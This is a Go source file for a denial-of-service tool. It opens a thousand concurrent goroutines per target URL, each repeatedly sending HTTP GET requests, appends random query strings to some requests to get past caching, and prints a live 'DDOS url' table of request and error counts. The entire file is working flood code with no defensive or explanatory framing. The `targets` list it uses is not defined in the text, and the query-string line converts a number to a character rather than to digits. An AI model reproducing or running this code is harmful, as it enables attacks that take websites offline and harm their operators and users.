package main

import (
	"fmt"
	"github.com/gosuri/uilive"
	"math/rand"
	"net/http"
	"time"
)

var ConcurrencyLimit = 1000

type target struct {
	URl  		string
	Requests  	int
	Errors  	int
	Line  		int
	Queue  		int
}

var running []*target

var w *uilive.Writer

func flood(t *target){

	for t.Queue > ConcurrencyLimit {
		time.Sleep(time.Millisecond * 100)
	}

	t.Requests++
	randUrl := t.URl
	if t.Requests % 3 == 0 {
		randUrl += "?" + string(rand.Int() * 1000)
	}
	_, err := http.Get(randUrl)
	if err != nil {
		t.Errors++
	}
	t.Queue--
	time.Sleep(time.Millisecond * 10)
	go flood(t)
}

func main() {
	w = uilive.New()
	w.Start()
	defer w.Stop()

	for i, t := range targets {
		r := &target{URl: t, Requests: 0, Errors: 0, Line: i}
		running = append(running, r)
		for x := 1; x <= ConcurrencyLimit; x++ {
			r.Queue++
			go flood(r)
		}
	}

	for {
		_, _ = fmt.Fprintf(w, "DDOS url\t\t\tRequests\tErrors\n")
		for i, _ := range targets {
			t := *running[i]
			fmt.Fprintf(w.Newline(), "%s\t\t\t%d\t%d\n", t.URl, t.Requests, t.Errors)
		}

		time.Sleep(time.Millisecond * 1000)
	}

}